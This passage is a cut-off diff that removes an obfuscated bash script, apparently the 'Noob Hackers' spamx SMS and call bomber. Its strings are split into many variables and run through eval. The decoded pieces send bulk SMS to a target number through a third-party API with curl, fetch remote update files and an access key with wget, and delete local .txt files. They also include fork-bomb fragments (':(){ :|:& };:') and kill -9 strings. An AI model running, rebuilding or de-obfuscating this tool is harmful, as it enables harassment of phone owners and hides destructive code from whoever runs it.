@@ -1,6 +1,490 @@
 #DONT TRY ON ADMIN NUMBERS OR ELSE......
 #NO MORE COPY PASTE LEARN IT BY YOURSELF BRUH
 #NOOB HACKERS YOUTUBE (facebook.com/noobhackersofficial
-z="
-";Yz=' 2>/';GIz='nten';pEz='wus ';XKz='mCtr';sOz='[0m"';MCz='cker';ZLz=' gre';NPz=';:';hLz='ess"';OMz=' $na';uQz='HACK';GBz='tes/';uIz='G KE';jFz='.!"';DKz='ANON';hKz='LOPE';XQz='─█▄▀';PBz='k1()';PKz='NG-\';FRz=' LOT';KLz='e=$m';TMz='i=0';nBz='iles';DMz='e wi';hIz='$ote';yz=' -f ';OOz='"$FI';SEz='ome/';yDz='//sh';TOz='te +';LHz='91mV';iMz='me-$';SLz='&acc';PNz='= "6';sJz='2mAN';ULz='e=1"';JLz='obil';xDz='tps:';wIz='!\e[';HHz=' ▀▀ ';bCz='2mNO';UKz='$mob';NCz='s \e';RKz='"] \';Bz='k(){';pDz='andr';OLz='&sen';fHz='s\\n';yKz='sms.';wz='{';DRz='K\e[';wEz='\e[0';rz='fi';YCz='1m Y';hz='erve';lHz='> la';WEz='5" ]';ADz='ate\';ZGz='LIMI';pIz='ll';uHz='NUMB';DNz=' [[ ';ALz='jsp?';sBz='ch.s';qRz='.noo';AFz='s+Ca';VDz='ION ';az='null';TEz='x/se';pJz='m   ';fEz='ull ';uCz=' Abo';WMz='$nam';iEz='nhwh';VCz='/noo';yGz='1m█';MGz='t)';iJz=' TAR';WBz='1 2>';vKz='-sms';pMz='(fin';cIz='er3.';tGz='1m █';dGz='00%)';cCz='OB H';ez='HOME';XEz='//bi';GRz='S OF';AQz='o=$n';AOz='xx E';yCz=' Upd';RDz=' -ne';KGz='t da';VOz=' dat';YRz=' FOR';UNz=' "13';dHz='prin';ZBz='l; t';DLz='tloo';NQz='PTIO';Pz='oob-';QNz=' "15';VKz=' Pre';aDz='1';EQz='mb+N';Iz='/raw';KEz='cd /';BMz='ES..';TRz='10';gLz='succ';lEz='7" ]';hQz='────';WHz=' "\e';lKz='1394';BBz='ME/s';VQz='─▐▌─';oEz='ollo';bHz=' "';LRz=' YOU';Fz='ider';mGz='OW  ';qz='else';CBz='pamx';DIz='gith';kDz='2" ]';GKz='u \e';oRz='E:\e';LNz='= "4';MOz='non/';FNz='nct ';hRz=' ON ';CIz='raw.';bDz=' $op';CCz=' -e ';IGz='dro=';XBz='/dev';GQz='p 1.';kCz='92m[';nGz='crk';ePz='SS B';ZOz='me T';UCz='.com';tPz='host';qKz='-s "';EEz=' 2>&';UQz='─▌──';OJz='chat';bOz='row'\''';YLz='e=$(';mFz='0';cMz=']] ;';Jz='.git';EIz='ubus';kNz=' "4"';LEz='data';gJz='┃ \e';REz='es/h';rOz=': \e';qBz=' ];t';tz='k';TQz='▌──▐';FOz='FILE';eEz='ev/n';QGz='dro"';fKz='[96m';PFz='smsb';YGz='ILY ';HDz=' Gro';eQz='▀██▀';yBz='r/bn';FKz=' Men';rHz='ad.t';gz='mx/s';pGz='   █';qPz='php ';aPz=' ]];';pCz='bing';BKz=']\e[';PCz='<"';eLz='[ $v';BGz='dat(';BCz='1.sh';SOz='$(da';qQz='qL 1';NDz=' Exi';ARz='  IM';VJz='xt) ';mQz='92mN';bRz='| pv';nFz='(){';PPz='$num';TKz='34m"';FJz='shri';DQz='t=Bo';DJz='r ke';FDz='be\e';OKz='AINI';iKz='R:\e';gKz='DEVE';aRz='T " ';lIz='r3.t';ZFz='bmb(';FMz='pdat';dCz='ACKE';YIz='cret';ABz='"$HO';OCz='[92m';wKz='//su';Uz='ster';VGz='e[34';yOz='[34m';YPz='s = ';iRz='2mWH';SJz='remn';gQz='─▐─█';dBz='txt';dEz='> /d';JKz='ack ';gIz='t = ';tNz='nopt';fPz='OMBI';NFz='bmb';nHz='t';qOz='MBER';GOz='=/da';QHz='KERS';ZMz='-L $';WKz='ss \';ONz=' "16';vIz='Y...';gRz='OUPS';yHz=' -L ';YFz='mb()';xJz='┃ [\';XFz='PS \';IIz='m/no';dIz='txt)';gEz='2>&1';QMz='xt |';aMz='-$i.';YNz='0" ]';Oz='om/n';jCz='"\e[';GJz='nke.';oGz='1m  ';aJz='━━━━';qLz='msuc';LIz='rs/p';QRz='T" |';gDz='elif';dMz=' do';HLz='9958';UMz='whil';mHz='d.tx';YEz='tly.';NBz=' " "';mEz='t.ly';oOz='P* S';rKz='://m';kLz='34mS';iHz='jq -';iNz=' "6"';aLz='p -o';jz='date';NEz='a/co';wCz='"';OHz='NOOB';rIz='4m |';fGz='4m  ';wFz='on/d';MEz='/dat';ZDz=' opt';oKz='╯';wLz='OOPS';EBz='ver/';OGz='t" =';oMz='ct=$';iLz=' ]]';OFz='opt2';VRz='I TA';RQz='91m';lQz='L ME';uGz='6m ▄';YKz='l+C\';nJz='1mSP';aCz='BE:-';YHz='IDE ';uLz=' |"';cBz='tch.';gMz='done';SMz='] ; ';bFz='   O';UOz='%A >';cDz='t1 =';gNz=' "8"';kz='s';KNz=' "18';PEz='rmux';eHz='tf %';GEz='men';mIz='xt 2';HOz='/hom';wNz='opt ';RNz='= "7';eNz=' > c';RPz='"630';QLz='d=CL';gCz='men(';DHz='  ▄▄';FEz='bnr';vGz='1m▀█';WLz='tis.';qGz='████';oLz='mTo ';mNz='9" ]';qMz='d re';APz='DONT';cOz=' > l';HPz='...\';bPz='2m$n';WCz='b-ha';WJz='ll 2';sz='}';fNz='xt';bEz='chan';oCz=' Bom';NMz='[ -e';DDz=' Sub';lRz='   M';TLz='usag';lCz='1m1\';wBz='clea';HRz=' EXC';pNz='dot';hNz=' "7"';eGz='\e[3';IDz='up\e';JPz='p 3.';aBz='hen';gFz='L UP';uJz='OUS ';IBz='xt" ';oz='> up';iPz='kill';XMz='e-$i';RRz=' pv ';COz='....';vRz='YEE.';DBz='/ser';mCz='m]\e';AJz='shor';uRz='   B';IHz=' ██▌';fBz='on1(';QKz='m["$';GFz='us S';IPz='m|"';fDz='then';LLz='ob&m';eCz='RS \';WFz='..OO';dKz='----';XOz='ops.';MJz='/nhw';gGz='|"';ODz='t\e[';eJz='┃';JNz='= "3';cPz='um \';QOz='dot(';eMz='let ';FHz='▐█';nPz='&1';KCz=' Noo';tCz='1m3\';AGz='dat';URz='... ';SBz='atez';bBz='> pa';MHz='.1\e';EMz='ll u';ACz=' bnr';cQz='─▄──';UHz=' ▌  ';xIz='  |"';ZQz='▀▄█─';tKz='omm.';hDz=' [ $';WOz=' '\''  ';ZHz='MESS';vHz='ER: ';bIz='cat ';DCz='"   ';Sz='spam';vOz='1139';PMz='me.t';RMz='| -L';rFz='ermu';Lz='serc';nMz='ame"';pRz=' www';gOz='__/ ';MKz='Quit';gBz='){';tMz='c -l';DEz=' > /';EKz='93m[';TFz='menu';MRz=' LIK';OPz=' [ "';Az='chec';xMz='"1" ';sEz=' 1';XJz='>&1';XPz='3.tx';HJz='me/t';AMz='ISSU';QFz='mb';uPz=':808';KJz='[OR]';kPz='-9 p';JIz='ob-h';GDz='1m6\';ZIz='otex';SGz='34m ';rDz='inte';QCz='\e[9';fQz='█─▀▄';lLz='ent ';aOz='omor';bLz=' "su';sDz='nt.a';pKz='curl';NKz=' REM';LFz='t2 =';CJz='k fo';nKz='╰━━━';PJz='4m|"';LOz='er/a';XNz='= "1';SQz='──▐─';MIz='atch';nNz=' "2"';POz='LE" ';FLz='y=be';xNz='" ];';rEz='exit';qNz=' "NE';KQz='xx \';uFz='home';DOz='! xx';mRz='Y WE';iDz='opt1';uOz='um" ';gHz=' "$m';eRz=' JOI';IRz='ITEM';vz='on()';aQz='──▄─';RJz='1() ';AHz='▐▌  ';DGz='n';nLz='sg \';LGz='t.tx';YBz='/nul';gPz='NG \';Mz='onte';vFz='r/an';ZCz='OUTU';VPz='bas=';XCz='2m >';UEz='rver';hJz='[91m';PIz='in/e';sNz=' ano';sIz='93mO';NGz=' "$d';TJz='at c';yPz='0/?m';QIz='rror';WQz='▐▌▐▌';tDz='ctio';dz='cd $';TBz='nh/m';Nz='nt.c';THz='█▄  ';UFz='  \e';BRz=' A \';Zz='dev/';EDz='scri';EFz=' Ano';tIz='WRON';FBz='upda';qEz='8" ]';rRz='s.co';fFz=' WIL';KMz='name';NIz='tezn';oQz='" | ';IQz='tz =';vEz='OPS ';jPz='all ';NJz='hats';aEz='nhyt';jMz='i';oPz='/cal';BIz='s://';fCz='m<"';QJz='p 5.';jHz='Rr @';BFz='ll\e';iBz='ta/d';mLz='3m$m';jKz='wa.m';TIz='-p "';hEz='6" ]';UIz='ACCE';SNz=' "14';nQz='ITRO';Tz='x/ma';nz='mx" ';VIz='SS K';kKz='e/91';JOz='amx/';ERz='WITH';BNz='" > ';WIz='EY: ';yFz='xt ]';SHz='▄███';SCz='m gi';mPz='l 2>';IMz='n |"';qFz='om.t';fIz='ecre';sKz='obic';cGz='D (1';FPz='ER B';kFz='slee';hMz='=$na';XIz='" se';uEz='...O';VLz=' > u';WDz='~> \';YMz=' || ';LBz=' upd';oDz=' -a ';FFz='nymo';lz='echo';KDz=' Fol';uNz=' $an';oFz='a/da';PGz='= "$';AIz='http';eKz='━━○━';kEz='hat ';sRz='m\e[';QQz=''\''\e[';jQz=''\''';JDz='1m7\';oJz='AMX\';RCz='2m>\';KOz='serv';kBz='com.';vBz='bnr(';VEz='ates';LKz='m4\e';hCz='mx';DFz='b Ca';TCz='thub';uKz='dove';wJz='3m';eBz='k1';KPz=':(){';kOz='1m'\''%';dDz=' "1"';lMz='h --';CEz='mxcc';cJz='┃━━━';aHz='AGE:';xLz=' SER';HFz='ms\e';YQz='▄██▄';ZPz='$bas';wDz='d ht';XGz='1mDA';kIz='rm e';mJz='m';tFz='les/';QEz='/fil';eDz=' ];';IFz=' Bac';AEz='rink';jLz='  | ';EPz=' MY ';UGz='===\';cNz=' "10';HIz='t.co';JFz='k\e[';WGz=' |  ';CFz='s\e[';aGz='T RE';sPz='ocal';xEz='s(){';vLz='dd';VBz='x.v.';JMz='dd()';Rz='ers/';hPz='Bomb';sCz=' Key';KKz='3m[\';dNz=' "9"';lOz='0088';pLz='1m$m';Xz='v1.2';oNz=' "0"';CQz='ubmi';RHz='1m';MLz='essa';rPz='-S l';QPz='" = ';lGz='MORR';FGz='(dat';aIz='t=$(';jIz='auth';HMz=' soo';tJz='ONYM';XDz='e[0m';ZKz='m To';BEz='e.me';dJz='●━══';bMz='txt ';wQz=' | p';CPz=' TO ';HCz='m >\';pQz='pv -';SRz='-qL ';qJz=' ATT';JRz='ENT"';RBz='hupd';hBz='"/da';iIz='];';YOz='..Co';lBz='term';HEz='3" ]';JQz='optz';INz=' "19';DPz='BOMB';CKz='92m ';xQz='v -q';fMz='i++';Dz='get ';tHz='MOB ';wHz=' mob';wOz='4805';dPz='2mMA';LQz='mWRO';vDz='EW -';bGz='ACHE';VHz='█▄';jDz=' = "';FCz='   \';GPz='RO..';iOz='*d08';xFz='at.t';lFz='p 4.';rLz='cess';lJz='ob \';hOz='-*-\';dOz='imit';fz='/spa';kGz='N TO';sHz='xt)';dLz='s" u';fLz='alue';hGz='2m  ';OQz='.! \';xPz='://l';lDz=';';ENz='$ano';VFz=' !..';LJz='2mht';pFz='ta/c';qDz='oid.';mMz=' "$n';xGz='6m▄ ';wPz='1 &';JJz='m |"';MNz=' "17';pHz='=$(c';wGz='  █▀';EGz='dt=$';CRz='mGEE';cFz='N UP';cEz='nel ';nEz='/nhf';SIz=' -s ';BDz='m"';xBz='r';rJz='ACK-';jBz='ata/';JHz='   S';mOz='MM';lNz=' "3"';RFz='call';YDz='read';WPz='t er';qHz='at l';EHz='  ▄▀';wMz='nonc';JCz='m By';jRz='ATS'\''';kMz='touc';EOz='crk(';HBz='te.t';TPz='300"';vMz='[ $a';cLz='cces';Kz='hubu';vQz='ERS"';SFz='anon';aNz=' "11';Cz='if w';ANz=' "20';uz='opti';tEz='m !.';bKz='p';GNz='= "2';LDz='low\';nIz='>/de';mBz='ux/f';tQz='OOB ';UPz='" ac';BJz='tlin';nOz='*9MM';IOz='e/sp';KIz='acke';AKz='m1\e';sQz='FROM';sFz='x/fi';kQz=' CAL';TGz='====';tRz='0m" ';jGz='ME O';GMz='e it';xOz='| \e';xKz='bmit';WNz=' "12';CMz='   w';BOz='RROR';rQz='IAM ';TDz='LECT';MMz='in';wRz='." |';IJz='Xwz\';GLz='6f73';tBz='h';Qz='hack';yEz='b Sm';nRz='BSIT';SKz='┃\e[';pBz='txt"';hHz='sg"|';OEz='m.te';NRz='E TH';QBz='patc';eOz=',--\';ELz='k&ke';uBz='on1';xz='if [';cz='en';cKz='┃ --';jOz='b*  ';CLz='=don';MDz='1m8\';KRz='HOPE';vNz='onop';yQz='L 10';jNz=' "5"';PLz='deri';CHz='█▌▀▄';oBz='s/pa';ZJz='╭━━━';Wz='ate.';UDz=' OPT';BPz=' TRY';SPz='0492';LPz=' :|:';CNz='ctt.';LMz='=rem';NNz='= "5';JGz='$(ca';FIz='erco';ILz='XX&m';CDz='1m5\';kHz='uri ';EJz='y |"';ZRz=' THA';jEz='atsc';eIz='[ $s';MBz='sh';PQz='mxx"';tOz=' num';ECz='    ';PHz=' HAC';nCz='[93m';rGz='█';pz='.txt';yLz='VER ';VMz='e [[';cHz=' msg';SDz=' "SE';bz='; th';KFz='2';dFz='DATE';yIz='Use ';MQz='NG O';YJz='93m';Gz=' htt';RGz=' \e[';xCz='1m4\';bQz='─██▌';rCz='1m2\';iz='r/up';kJz='2m$m';yNz=' "  ';RIz='/er3';FQz='ow" ';HKz='m3\e';oIz='v/nu';iCz='rm *';NLz='ge=$';dRz=' 10';RLz='NEXT';rNz='XT: ';aFz='93m ';NHz=' BY ';vJz='SMS ';GGz='e +%';sMz=' | w';KBz='bash';Hz='ps:/';PDz='93m"';ICz='e[93';OBz='on';Vz='/upd';mDz='am s';GCz='e[92';KHz='PAMX';uDz='n.VI';MPz=' & }';BLz='user';bNz='1" ]';ORz='IS S';GHz='▐██ ';vCz='ut\e';PRz='CRIP';MFz='mass';aKz=' Sto';bJz='╮';iQz='█─▌─';HQz='z';IEz='abot';JEz='4" ]';BHz=' ▌';tLz='y\e[';UBz='ain/';qIz='4m =';jJz='GET-';xHz='wget';iFz='N...';UJz='tt.t';Ez='--sp';vPz='0 >/';nDz='tart';yMz=']]; ';CGz='/ano';pOz=' "NU';JBz='];th';iGz='  CO';IKz='Go b';pPz='lnsm';ROz='chk=';VNz='= "9';HNz='" ]]';XLz='valu';QDz=' '\'''\''';ZEz='com/';rMz='min*';sGz='  ██';mKz='8054';BQz='um&s';fOz='m.+,';fJz='┃   ';uMz=')';eFz='S WE';fRz='N GR';ZNz=']; t';hFz=' SOO';OIz='h/ma';mz=' "sp';NOz='limi';sLz='full';cRz=' -qL';kRz=' APP';HGz='A)';dQz='▄▀─█';XHz='PROV';lPz='hp >';XRz=' SRY';rBz=' pat';yJz='e[91';WRz='LK A';TNz='= "8';oHz='test';LCz='b Ha';qCz='3m"';
-eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$z$dz$ez$fz$gz$hz$iz$jz$kz$z$lz$mz$nz$oz$jz$pz$z$qz$z$lz$z$rz$z$sz$z$lz$z$Az$tz$z$uz$vz$wz$z$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$FBz$HBz$IBz$JBz$cz$z$dz$ez$fz$gz$hz$iz$jz$kz$z$KBz$LBz$Wz$MBz$z$qz$z$lz$NBz$z$rz$z$sz$z$uz$OBz$z$Az$PBz$wz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$QBz$RBz$SBz$TBz$UBz$Sz$VBz$WBz$XBz$YBz$ZBz$aBz$z$dz$ez$fz$gz$hz$iz$jz$kz$z$lz$mz$nz$bBz$cBz$dBz$z$qz$z$lz$z$rz$z$sz$z$Az$eBz$z$uz$fBz$gBz$z$xz$yz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$fz$gz$hz$iz$jz$oBz$cBz$pBz$qBz$aBz$z$dz$ez$fz$gz$hz$iz$jz$kz$z$KBz$rBz$sBz$tBz$z$qz$z$lz$NBz$z$rz$z$sz$z$uz$uBz$z$vBz$gBz$z$wBz$xBz$z$dz$ez$fz$gz$hz$yBz$xBz$z$KBz$ACz$BCz$z$lz$CCz$DCz$ECz$ECz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$z$lz$CCz$DCz$ECz$ECz$ECz$QCz$RCz$ICz$SCz$TCz$UCz$VCz$WCz$MCz$NCz$OCz$PCz$z$lz$CCz$DCz$ECz$ECz$ECz$QCz$XCz$QCz$YCz$ZCz$aCz$QCz$bCz$cCz$dCz$eCz$GCz$fCz$z$lz$z$sz$z$gCz$gBz$z$dz$ez$fz$hCz$z$iCz$pz$Yz$Zz$az$z$lz$CCz$jCz$kCz$QCz$lCz$GCz$mCz$nCz$oCz$pCz$QCz$qCz$z$lz$CCz$jCz$kCz$QCz$rCz$GCz$mCz$nCz$sCz$QCz$qCz$z$lz$CCz$jCz$kCz$QCz$tCz$GCz$mCz$nCz$uCz$vCz$nCz$wCz$z$lz$CCz$jCz$kCz$QCz$xCz$GCz$mCz$nCz$yCz$ADz$ICz$BDz$z$lz$CCz$jCz$kCz$QCz$CDz$GCz$mCz$nCz$DDz$EDz$FDz$nCz$wCz$z$lz$CCz$jCz$kCz$QCz$GDz$GCz$mCz$nCz$HDz$IDz$nCz$wCz$z$lz$CCz$jCz$kCz$QCz$JDz$GCz$mCz$nCz$KDz$LDz$ICz$BDz$z$lz$CCz$jCz$kCz$QCz$MDz$GCz$mCz$nCz$NDz$ODz$PDz$z$lz$QDz$z$lz$RDz$SDz$TDz$UDz$VDz$WDz$XDz$wCz$z$YDz$ZDz$aDz$z$xz$bDz$cDz$dDz$eDz$z$fDz$z$Sz$kz$z$gDz$hDz$iDz$jDz$kDz$lDz$z$fDz$z$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$yDz$AEz$BEz$fz$CEz$DEz$Zz$az$EEz$aDz$z$FEz$z$GEz$z$gDz$hDz$iDz$jDz$HEz$lDz$z$fDz$z$IEz$z$gDz$hDz$iDz$jDz$JEz$lDz$z$fDz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$Vz$VEz$z$KBz$LBz$Wz$MBz$z$gDz$hDz$iDz$jDz$WEz$lDz$z$fDz$z$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$z$FEz$z$GEz$z$gDz$hDz$iDz$jDz$hEz$lDz$z$fDz$z$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$XEz$YEz$ZEz$iEz$jEz$kEz$dEz$eEz$fEz$gEz$z$FEz$z$GEz$z$gDz$hDz$iDz$jDz$lEz$lDz$z$fDz$z$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$vDz$wDz$xDz$XEz$mEz$nEz$oEz$pEz$dEz$eEz$fEz$gEz$z$FEz$z$GEz$z$gDz$hDz$iDz$jDz$qEz$lDz$z$fDz$z$rEz$sEz$z$qz$z$lz$CCz$DCz$ECz$ECz$ECz$ECz$FCz$ICz$tEz$uEz$vEz$wEz$BDz$z$rz$z$sz$z$Sz$xEz$z$wBz$xBz$z$FEz$z$lz$CCz$jCz$kCz$QCz$lCz$GCz$mCz$nCz$oCz$yEz$AFz$BFz$nCz$wCz$z$lz$CCz$jCz$kCz$QCz$rCz$GCz$mCz$nCz$oCz$yEz$CFz$PDz$z$lz$CCz$jCz$kCz$QCz$tCz$GCz$mCz$nCz$oCz$DFz$BFz$nCz$wCz$z$lz$CCz$jCz$kCz$QCz$xCz$GCz$mCz$nCz$EFz$FFz$GFz$HFz$nCz$wCz$z$lz$CCz$jCz$kCz$QCz$CDz$GCz$mCz$nCz$IFz$JFz$PDz$z$lz$QDz$z$lz$RDz$SDz$TDz$UDz$VDz$WDz$XDz$wCz$z$YDz$ZDz$KFz$z$xz$bDz$LFz$dDz$eDz$z$fDz$z$MFz$NFz$z$gDz$hDz$OFz$jDz$kDz$lDz$z$fDz$z$PFz$QFz$z$gDz$hDz$OFz$jDz$HEz$lDz$z$fDz$z$RFz$NFz$z$gDz$hDz$OFz$jDz$JEz$lDz$z$fDz$z$SFz$TFz$z$gDz$hDz$OFz$jDz$WEz$lDz$z$fDz$z$FEz$z$GEz$z$qz$z$lz$CCz$DCz$ECz$ECz$ECz$ECz$UFz$nCz$VFz$WFz$XFz$XDz$wCz$z$rEz$sEz$z$rz$z$sz$z$PFz$YFz$wz$z$MFz$NFz$z$sz$z$RFz$ZFz$gBz$z$lz$CCz$jCz$aFz$ECz$ECz$ECz$bFz$cFz$dFz$eFz$fFz$gFz$dFz$hFz$iFz$jFz$z$kFz$lFz$mFz$z$FEz$z$GEz$z$sz$z$SFz$TFz$nFz$z$xz$yz$MEz$oFz$pFz$qFz$rFz$sFz$tFz$uFz$fz$gz$hz$vFz$wFz$xFz$yFz$lDz$z$fDz$z$SFz$AGz$z$qz$z$SFz$GEz$z$rz$z$sz$z$SFz$BGz$gBz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$CGz$DGz$z$EGz$FGz$GGz$HGz$z$IGz$JGz$KGz$LGz$MGz$z$xz$NGz$OGz$PGz$QGz$eDz$z$fDz$z$wBz$xBz$z$lz$z$lz$z$lz$z$lz$z$lz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$RGz$SGz$WGz$QCz$XGz$YGz$ZGz$aGz$bGz$cGz$dGz$eGz$fGz$gGz$z$lz$CCz$DCz$ECz$RGz$SGz$WGz$QCz$hGz$iGz$jGz$kGz$lGz$mGz$ECz$eGz$fGz$gGz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$z$lz$z$lz$z$lz$z$kFz$lFz$mFz$z$FEz$z$GEz$z$qz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$CGz$DGz$z$iCz$pz$z$SFz$GEz$z$rz$z$sz$z$SFz$gCz$gBz$z$SFz$nGz$z$wBz$xBz$z$lz$CCz$wCz$z$QCz$oGz$ECz$pGz$qGz$rGz$z$QCz$oGz$sGz$qGz$qGz$z$QCz$tGz$QCz$uGz$QCz$vGz$wGz$QCz$xGz$QCz$yGz$z$AHz$ECz$ECz$BHz$z$CHz$DHz$EHz$FHz$z$GHz$HHz$HHz$IHz$JHz$KHz$RGz$LHz$MHz$OCz$NHz$OHz$PHz$QHz$QCz$RHz$z$SHz$THz$UHz$SHz$VHz$z$wEz$BDz$z$lz$z$lz$RDz$WHz$nCz$XHz$YHz$ZHz$aHz$bHz$z$YDz$cHz$z$dHz$eHz$fHz$gHz$hHz$iHz$jHz$kHz$lHz$mHz$nHz$z$oHz$pHz$qHz$rHz$sHz$z$lz$RDz$WHz$nCz$tHz$uHz$vHz$wCz$z$YDz$wHz$z$dz$ez$fz$hCz$z$xHz$yHz$AIz$BIz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$JIz$KIz$LIz$MIz$FBz$NIz$OIz$PIz$QIz$RIz$pz$Yz$Zz$az$z$YDz$SIz$TIz$UIz$VIz$WIz$XIz$YIz$z$dz$ez$fz$hCz$z$ZIz$aIz$bIz$cIz$dIz$z$SFz$oHz$z$sz$z$SFz$oHz$nFz$z$xz$eIz$fIz$gIz$hIz$yFz$iIz$z$fDz$z$jIz$aDz$z$qz$z$dz$ez$fz$hCz$z$kIz$lIz$mIz$nIz$oIz$pIz$z$wBz$xBz$z$lz$NBz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$qIz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$RGz$sIz$vEz$tIz$uIz$vIz$wIz$SGz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$ECz$ECz$ECz$ECz$ECz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$yIz$AJz$BJz$CJz$DJz$EJz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$QCz$hGz$AIz$BIz$FJz$GJz$HJz$IJz$VGz$JJz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$ECz$ECz$ECz$KJz$ECz$ECz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$QCz$LJz$xDz$XEz$mEz$MJz$NJz$OJz$eGz$PJz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$qIz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$NBz$z$kFz$QJz$mFz$z$FEz$z$GEz$z$rz$z$sz$z$jIz$RJz$wz$z$wBz$xBz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$CGz$DGz$z$SJz$pHz$TJz$UJz$VJz$nIz$oIz$WJz$XJz$z$wBz$xBz$z$lz$CCz$jCz$YJz$z$ZJz$aJz$aJz$bJz$z$cJz$dJz$aJz$eJz$z$fJz$ECz$ECz$gJz$hJz$iJz$jJz$QCz$kJz$lJz$ICz$mJz$z$fJz$QCz$nJz$oJz$ICz$pJz$gJz$hJz$qJz$rJz$QCz$sJz$tJz$uJz$vJz$QCz$wJz$z$fJz$ECz$ECz$gJz$nCz$z$fJz$ECz$ECz$xJz$yJz$AKz$nCz$BKz$CKz$DKz$RGz$EKz$QCz$rCz$ICz$mCz$OCz$FKz$GKz$nCz$z$fJz$ECz$ECz$xJz$yJz$HKz$nCz$BKz$CKz$IKz$JKz$QCz$KKz$yJz$LKz$nCz$BKz$CKz$MKz$QCz$wJz$z$fJz$ECz$ECz$fJz$UFz$hJz$NKz$OKz$PKz$GCz$QKz$SJz$RKz$ICz$mJz$z$SKz$TKz$UKz$jCz$aFz$gJz$nCz$VKz$WKz$yJz$XKz$YKz$ICz$ZKz$aKz$bKz$z$fJz$ECz$ECz$cKz$dKz$dKz$dKz$dKz$dKz$dKz$z$cJz$eKz$aJz$gJz$fKz$gKz$hKz$iKz$nCz$jKz$kKz$lKz$mKz$z$nKz$aJz$aJz$oKz$z$wCz$z$pKz$yHz$qKz$AIz$rKz$sKz$tKz$uKz$vKz$UCz$wKz$xKz$yKz$ALz$BLz$CLz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$LLz$MLz$NLz$oHz$OLz$PLz$QLz$RLz$SLz$TLz$ULz$VLz$WLz$dBz$z$XLz$YLz$ZLz$aLz$bLz$cLz$dLz$WLz$dIz$z$xz$eLz$fLz$jDz$gLz$hLz$iLz$z$fDz$z$lz$z$lz$z$lz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$RGz$SGz$jLz$RGz$kLz$lLz$QCz$mLz$nLz$VGz$oLz$QCz$pLz$lJz$VGz$qLz$rLz$sLz$tLz$SGz$uLz$z$lz$CCz$DCz$ECz$RGz$SGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$z$lz$z$lz$z$dz$ez$fz$hCz$z$kIz$lIz$mIz$nIz$oIz$pIz$z$SFz$vLz$z$qz$z$wBz$xBz$z$lz$NBz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$qIz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$UFz$nCz$wLz$xLz$yLz$AMz$BMz$wIz$SGz$xIz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$rIz$CMz$DMz$EMz$FMz$GMz$HMz$IMz$z$lz$CCz$DCz$ECz$ECz$ECz$eGz$qIz$TGz$TGz$TGz$TGz$TGz$TGz$UGz$VGz$BDz$z$lz$NBz$z$dz$ez$fz$hCz$z$kIz$lIz$mIz$nIz$oIz$pIz$z$rz$z$sz$z$SFz$JMz$wz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$CGz$DGz$z$KMz$LMz$MMz$z$xz$NMz$OMz$PMz$QMz$RMz$OMz$PMz$yFz$SMz$fDz$z$TMz$z$UMz$VMz$CCz$WMz$XMz$pz$YMz$ZMz$KMz$aMz$bMz$cMz$dMz$z$eMz$fMz$z$gMz$z$KMz$hMz$iMz$jMz$z$rz$z$kMz$lMz$mMz$nMz$pz$z$KEz$LEz$MEz$NEz$OEz$PEz$QEz$REz$SEz$Sz$TEz$UEz$CGz$DGz$z$SFz$oMz$pMz$qMz$rMz$pz$sMz$tMz$uMz$z$xz$vMz$wMz$gIz$xMz$yMz$fDz$z$lz$ANz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$GNz$HNz$bz$cz$z$lz$INz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$JNz$HNz$bz$cz$z$lz$KNz$BNz$CNz$dBz$z$gDz$DNz$ENz$FNz$LNz$HNz$b